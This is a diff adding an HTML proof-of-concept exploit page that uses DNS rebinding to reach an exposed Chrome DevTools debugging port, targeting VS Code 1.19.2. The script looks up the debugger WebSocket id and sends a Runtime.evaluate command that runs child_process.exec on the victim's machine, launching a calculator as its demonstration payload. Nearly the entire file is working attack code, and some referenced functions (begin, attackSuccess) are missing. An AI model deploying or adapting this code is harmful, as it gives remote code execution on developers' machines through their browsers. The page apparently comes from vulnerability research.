@@ -1,0 +1,97 @@
+<!doctype html>
+<!--
+    Multi-platform exploit adapted from:
+    https://medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486b
+
+    Tested against VS Studio Code 1.19.2 and at least one another software with a slight modification.
+    Subsequent versions of VS Studio Code fixed the issue.
+    The default port is TCP 9333 (localhost:9333).
+-->
+<html>
+
+<head>
+    <title>payload-exposed-chrome-devtools</title>
+    <script src="payload.js"></script>
+    <script>
+        function attack() {
+            let response;
+            let data;
+            let loc;
+            fetch('/json')
+                .then(function (r) { //response
+                    response = r;
+                   if (response.status == 404) {
+                        throw new Error('404')
+                    } else if (response.ok) {
+                        console.log("attack frame ", window.location.hostname, " received a response")
+                        loc = window.location;
+                        return response.text()
+                    }
+                })
+                .then(function (j) { // data
+                    let data = JSON.parse(j)[0];
+                    let wsid = data.id;
+                    let wsURL = "ws://" + location.hostname + ":" + loc.port 
+                       + "/" + wsid
+                    console.log(wsURL);
+                    exploit(wsURL);
+                    attackSuccess(wsURL);
+                })
+                .catch(function (error) {
+                    if (error instanceof TypeError) { // We cannot establish an HTTP connection
+                        console.log("frame " + window.location.hostname + " could not load");
+                        window.parent.postMessage({
+                            status: "error"
+                        }, "*")
+                    } else if (error.message == 'hastoken') {
+                        console.log('DNS rebinding did not happen yet')
+                    } else if (error.message == '404') { // We received a 404
+                        console.log("file not found. Frame " + window.location.hostname +
+                            " has not updated dns yet, waiting " + interval +
+                            " ms")
+                    } else { // We did not handle something
+                        console.log('Unhandled error: ' + error);
+                    }
+                })
+        }
+
+        function exploit(url) {
+            function nodejs() {
+                const cmd = {
+                    darwin: 'open /Applications/Calculator.app',
+                    win32: 'calc',
+                    linux: 'xcalc',
+                };
+                process.mainModule.require('child_process').exec(
+                    cmd[process.platform])
+            };
+            const packet = {
+                "id": 1,
+                "method": "Runtime.evaluate",
+                "params": {
+                    "expression": `(${nodejs})()`,
+                }
+            };
+            const ws = new WebSocket(url);
+            ws.onopen = () => ws.send(JSON.stringify(packet));
+            ws.onmessage = ({
+                data
+            }) => {
+                if (JSON.parse(data).id === 1)
+                    ws.close();
+            };
+            ws.onerror = err => console.error('failed to connect');
+        }
+    </script>
+</head>
+
+<body onload="begin()">
+    <p>
+        <h3>DNS Rebinding Vulnerability Chromedev Tools</h3>
+    </p>
+    <p>
+        This page is waiting for a dns update.
+    </p>
+</body>
+
+</html>
